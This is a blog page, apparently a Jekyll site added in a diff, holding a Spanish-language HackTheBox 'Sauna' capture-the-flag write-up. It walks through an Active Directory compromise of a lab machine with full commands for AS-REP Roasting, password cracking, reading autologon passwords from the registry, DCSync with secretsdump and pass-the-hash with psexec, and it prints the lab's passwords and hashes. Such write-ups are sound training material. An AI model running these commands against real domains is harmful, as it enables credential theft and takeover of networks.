@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>HTB Sauna Write-up (Español)</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Sauna Write-up (Español) | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="HTB Sauna Write-up (Español)" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="I cloned my writeup that was originally posted on medium" />
+<meta property="og:description" content="I cloned my writeup that was originally posted on medium" />
+<link rel="canonical" href="http://localhost:8000/Sauna-Espa%C3%B1ol" />
+<meta property="og:url" content="http://localhost:8000/Sauna-Espa%C3%B1ol" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/Sauna/1__i__enw5__Rg5ZLLoPDehOMqw.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-07-18T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/Sauna/1__i__enw5__Rg5ZLLoPDehOMqw.png" />
+<meta property="twitter:title" content="HTB Sauna Write-up (Español)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2020-07-18T00:00:00-05:00","datePublished":"2020-07-18T00:00:00-05:00","description":"I cloned my writeup that was originally posted on medium","headline":"HTB Sauna Write-up (Español)","image":"http://localhost:8000/assets/images/Sauna/1__i__enw5__Rg5ZLLoPDehOMqw.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Sauna-Espa%C3%B1ol"},"url":"http://localhost:8000/Sauna-Espa%C3%B1ol"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/Sauna/1__i__enw5__Rg5ZLLoPDehOMqw.png/../banner.png>
+  
+  <h2>HTB Sauna Write-up (Español)</h2>
+  <time datetime="2020-07-18T00:00:00-05:00" class="by-line">18 Jul 2020</time>
+  <p>I cloned my writeup that was originally posted on <a href="https://medium.com/@5ubterranean/htb-sauna-write-up-espa%C3%B1ol-67d4d0eff1c6">medium</a></p>
+
+<p>Sauna es una máquina basada en Windows que estuvo activa desde el 15 de Febrero del 2020 hasta el 18 de Julio, para resolver esta máquina tendremos que crear una lista de posible usuarios basándonos en la información que encontramos en su página web, a falta de información probaremos si alguno de los supuestos usuarios es susceptible a AS-REP Roasting, tenemos exito consiguiendo un ticket del usuario “fsmith”, crackeamos la contraseña y conseguimos acceso al servidor, luego conseguimos la contraseña del usuario “svc_loanmgr”, el cual se logea automáticamente al servidor, por lo que la encontramos en el registro de winlogon, por últimos realizamos un DC Sync con este usuario para conseguir el hash de administrador, y nos logeamos como dicho usuario realizando un pass the hash.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Empezamos usando masscan para encontrar todos los puertos disponibles y luego usamos nmap para conseguir más información de los mismos.</p>
+
+<p>masscan -e tun0 –rate=500 -p 0–65535 10.10.10.175<br />
+nmap -sC -sV -p 57075,53,464,445,389,49673,80,3269,49686,135,88,9389,139,593,5985,4974,636,3268 -o scan.txt 10.10.10.175</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE    SERVICE       VERSION  
+53/tcp    open     domain?  
+| fingerprint-strings:   
+|   DNSVersionBindReqTCP:   
+|     version  
+|<span class="se">\_</span>    <span class="nb">bind  
+</span>80/tcp    open     http          Microsoft IIS httpd 10.0  
+| http-methods:   
+|<span class="se">\_</span>  Potentially risky methods: TRACE  
+|<span class="se">\_</span>http-server-header: Microsoft-IIS/10.0  
+|<span class="se">\_</span>http-title: Egotistical Bank :: Home  
+88/tcp    open     kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2020-04-25 00:05:24Z<span class="o">)</span>  
+135/tcp   open     msrpc         Microsoft Windows RPC  
+139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn  
+389/tcp   open     ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>  
+445/tcp   open     microsoft-ds?  
+464/tcp   open     kpasswd5?  
+593/tcp   open     ncacn<span class="se">\_</span>http    Microsoft Windows RPC over HTTP 1.0  
+636/tcp   open     tcpwrapped  
+3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>  
+3269/tcp  open     tcpwrapped  
+4974/tcp  filtered unknown  
+5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>  
+|<span class="se">\_</span>http-server-header: Microsoft-HTTPAPI/2.0  
+|<span class="se">\_</span>http-title: Not Found  
+9389/tcp  open     mc-nmf        .NET Message Framing  
+49673/tcp open     msrpc         Microsoft Windows RPC  
+49686/tcp open     msrpc         Microsoft Windows RPC  
+57075/tcp filtered unknown
+</code></pre></div></div>
+
+<p>Por el escaneo vemos que es un común Windows server, aunque lo que destaca es tener el puerto 80 abierto, antes de revisarlo revisamos LDAP/RPC. <code class="language-plaintext highlighter-rouge">ldapsearch -x -h 10.10.10.175 -b “DC=EGOTISTICAL-BANK,DC=LOCAL”</code></p>
+
+<p><img src="/assets/images/Sauna/1__x__NmKW4wMMgo6nL3MU4LLg.png" alt="" /></p>
+
+<p>No tenemos acceso a los usuarios del servidor, aunque encontramos una unidad organizacional llamada Hugo Smith, la cual podría ser también el nombre de un usuario, ya que no encontramos más información relevante, visitamos la página web.</p>
+
+<p><img src="/assets/images/Sauna/1__yMfXep__hqVl8JLFbgIanaQ.png" alt="" /></p>
+
+<p>La página parece ser la de una especie de banco, aunque no pudimos identificar ninguna vulnerabilidad en ella, lo más relevante lo encontramos en <a href="http://10.10.10.175/about.html">http://10.10.10.175/about.html</a>.</p>
+
+<p><img src="/assets/images/Sauna/1__AQDv__cnskT86mFbd0FDAbw.png" alt="" /></p>
+
+<p>La página tiene una sección de los integrantes de la empresa, una práctica común para crear los usuarios es tomar la primera letra del nombre, el apellido y juntarlos, a veces se pone un punto en medio, así que asumiendo esta posibilidad creamos una lista de posibles usuarios usando <a href="https://github.com/asciimoo/exrex">exrex</a>.</p>
+
+<p><img src="/assets/images/Sauna/1__DZUkdHaHhpx3BA4je4T2FA.png" alt="" /></p>
+
+<p>Así queda nuestra lista.</p>
+
+<p><img src="/assets/images/Sauna/1__MCGsVdAo1MTJmrCm0tu7bw.png" alt="" /></p>
+
+<h1 id="ganando-acceso">Ganando acceso</h1>
+
+<p>Usamos el módulo “kerberos_enumusers” de metasploit para validar nuestros usuarios, vemos que “hsmith” existe, y obtenemos un error con el usuario “fsmith”, quitamos este usuario de la lista y lo reintentamos, pero no encontramos otro usuario válido, ahora tenemos 2 usuarios “hsmith” y “fsmith” el cual conservamos ya que no podemos descartarlo debido al error.</p>
+
+<p><img src="/assets/images/Sauna/1__yGZAbBPkn5Yw0AE6jP6TDQ.png" alt="" /></p>
+
+<p>Intentamos adivinar la contraseña de uno de los 2 usuarios con listas pequeñas de contraseñas comunes (usar listas grandes tomaría demasiado tiempo) y las palabras encontradas en el sitio web sin ningún éxito, así que probamos suerte con algunos ataques a AD, en este caso AS-REP Roasting tiene éxito, para hacerlo usamos el script “GetNPUsers.py” de Impacket: <code class="language-plaintext highlighter-rouge">python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -u users.txt -dc-ip 10.10.10.175 -format john</code></p>
+
+<p><img src="/assets/images/Sauna/1__n171AXkEUkcbWY__L63YsxQ.png" alt="" /></p>
+
+<p>Bien conseguimos un ticket con “fsmith”, procedemos a crackearlo con john y obtenemos que la contraseña es “Thestrokes23”.</p>
+
+<p><img src="/assets/images/Sauna/1__5oRGzcOxzTPa3Zh1__9ujag.png" alt="" /></p>
+
+<p>Nos conectamos al servidor usando evil-wirm y conseguimos el “user.txt”.</p>
+
+<p><img src="/assets/images/Sauna/1__OBHLx84VoAMgjTD__vtFzmA.png" alt="" /></p>
+
+<h1 id="movimiento-lateral">Movimiento lateral</h1>
+
+<p>Como parte de la enumeración subimos y corremos <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winpeas</a> y este nos encuentras unas credenciales de autologon del usuario “svc_loanmgr”.</p>
+
+<p><img src="/assets/images/Sauna/1__Irqga78KAXbLr04fWdML__A.png" alt="" /></p>
+
+<p>Cuando un usuario se logea automáticamente a una computadora, sus credenciales son guardadas en el registro de windows, estas se pueden recuperar con los comandos:<br />
+<code class="language-plaintext highlighter-rouge">REG QUERY “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon” /v DefaultUserName</code> <br />
+<code class="language-plaintext highlighter-rouge">REG QUERY “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon” /v DefaultPassword</code></p>
+
+<p><img src="/assets/images/Sauna/1__dDlrV6Jhs659ov4h9XjTVQ.png" alt="" /></p>
+
+<h1 id="escalación-de-privilegios">Escalación de privilegios</h1>
+
+<p>Con este nuevo usuario podemos realizar un DC Sync, para esto usamos el script secretsdump.py de Impacket: <code class="language-plaintext highlighter-rouge">python3 secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:’Moneymakestheworldgoround!’@10.10.10.175 -dc-ip 10.10.10.175</code>.</p>
+
+<p><img src="/assets/images/Sauna/1__EMqhIESL33O3bMKMNoxR7w.png" alt="" /></p>
+
+<p>Vemos que conseguimos los hashes LMNT de Administrador “Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::”, no necesitamos crackearlos ya que podemos hacer un pass the hash con ellos: <code class="language-plaintext highlighter-rouge">python3 psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff</code>.</p>
+
+<p><img src="/assets/images/Sauna/1__CqlxeJG2lhQs134TW__lg2Q.png" alt="" /></p>
+
+<p>Y con eso somos authority\system y conseguimos el “root.txt”.</p>
+
+<h1 id="descargo-de-responsabilidad">Descargo de responsabilidad</h1>
+
+<p>Todos los recursos brindados en este post se hicieron puramente con fines educativos y de concientización, el autor no se hace responsable por las acciones que las personas puedan realizar con el contenido del mismo.</p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#as-rep-roasting"> AS-REP Roasting</a> &nbsp;
+  
+  <a href="/tags.html#active-directory"> Active Directory</a> &nbsp;
+  
+  <a href="/tags.html#dcsync"> DCSync</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
